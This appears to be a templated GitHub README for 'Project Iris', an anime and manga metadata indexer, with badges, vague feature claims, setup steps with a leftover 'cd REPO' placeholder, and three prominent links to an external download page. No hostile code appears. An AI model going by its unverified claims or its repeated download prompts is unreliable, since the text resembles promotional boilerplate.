# Project Iris v2026 - anime and manga metadata indexer 2026

> **Project Iris is a browser-accessible index for anime and manga metadata. Version 2026 brings together decentralized preservation, semantic discovery, and a web dashboard for finding, arranging, and exporting information in an archive-ready format.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewkingizee1867/project-iris-anime-indexer?style=flat-square)](https://github.com/andrewkingizee1867/project-iris-anime-indexer)

---

<p align="center">
  <a href="https://andrewkingizee1867.github.io/project-iris-anime-indexer/">
    <img src="https://img.shields.io/badge/Download-Project%20Iris%20Latest-brightgreen?style=for-the-badge" alt="Download Project Iris">
  </a>
</p>

> **[Download Project Iris v2026](https://andrewkingizee1867.github.io/project-iris-anime-indexer/)**

---

[Download Latest Build](https://andrewkingizee1867.github.io/project-iris-anime-indexer/)

---

## Overview

Project Iris concentrates on anime and manga metadata, not media playback. Its core purpose is to make records searchable, indexable, and easier to maintain over time through a responsive browser interface.

Whether you are reviewing a large catalog, maintaining curated lists, or organizing a preservation-oriented archive, Project Iris provides a structured way to inspect records and follow their source attribution. The dashboard, API export support, and integrity validation tools are suited to workflows where dependable discovery and repeatable access matter.

---

## What It Provides

- A decentralized metadata mesh designed for distributed indexing and preservation workflows
- Semantic search capabilities for locating anime and manga records more efficiently
- Source attribution that connects indexed metadata with its origin
- Adaptive curated lists for arranging collections and exploring catalog content
- A responsive web dashboard for modern browsers and devices
- An integrity checker for reviewing indexed information and exported records
- REST API export for connecting Project Iris metadata with external services and tools
- An archive- and P2P-oriented design suitable for preservation use cases

---

## Getting Started

To use the project, clone the repository or obtain the latest build, then serve the web interface and open it in a browser.

For a source-based setup:

```bash
git clone https://github.com/andrewkingizee1867/project-iris-anime-indexer.git
cd REPO
```

Use your preferred local static server or web hosting process to publish the files. Once the site is running, visit the dashboard from a browser.

---

## Using Project Iris

Begin at the main dashboard, where you can search the index and browse results through the available curated views.

A common process looks like this:

1. Load the interface in a web browser.
2. Find anime or manga records with keywords or semantic search.
3. Inspect the indexed information and its source attribution.
4. Export metadata through the REST API when another tool or service needs it.
5. Run the integrity checker before sharing or preserving records.

For collectors and teams, Project Iris can function as a shared discovery point for indexed items and as an organizing layer across multiple metadata sources.

---

## Settings

Most Project Iris behavior is controlled through the web interface and API-related settings. When deploying locally, keep any repository-provided settings files with the hosted site so that indexing, export, and validation operate consistently.

A representative configuration shape is:

```json
{
  "searchMode": "semantic",
  "showSourceAttribution": true,
  "enableIntegrityChecker": true,
  "apiExport": true
}
```

Before publishing a self-hosted instance, inspect the deployment files and adjust paths or endpoints that depend on your environment.

---

## Requirements

- A current web browser
- A local serving setup or web hosting environment
- Storage capacity for indexed metadata and archive content
- Network connectivity for API-backed discovery or export operations
- Enough memory and disk space for the catalog size you intend to manage

---

## Frequently Asked Questions

**How can I update my installation?**  
Download the newest published build, or pull the latest repository state when running Project Iris from source.

**Where are search and export options configured?**  
Start with the web dashboard. If the required option is not there, check the deployment's configuration files and API settings.

**Why might some results be missing or incomplete?**  
Refresh or rebuild the index, then use the integrity checker to verify that the stored metadata is consistent.

**Can Project Iris connect to other software?**  
Yes. Its REST API export can be used with outside dashboards, catalogs, and automation workflows.

**Who is Project Iris intended for?**  
It is intended for users maintaining anime and manga metadata, preservation-focused archives, and searchable catalog systems.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
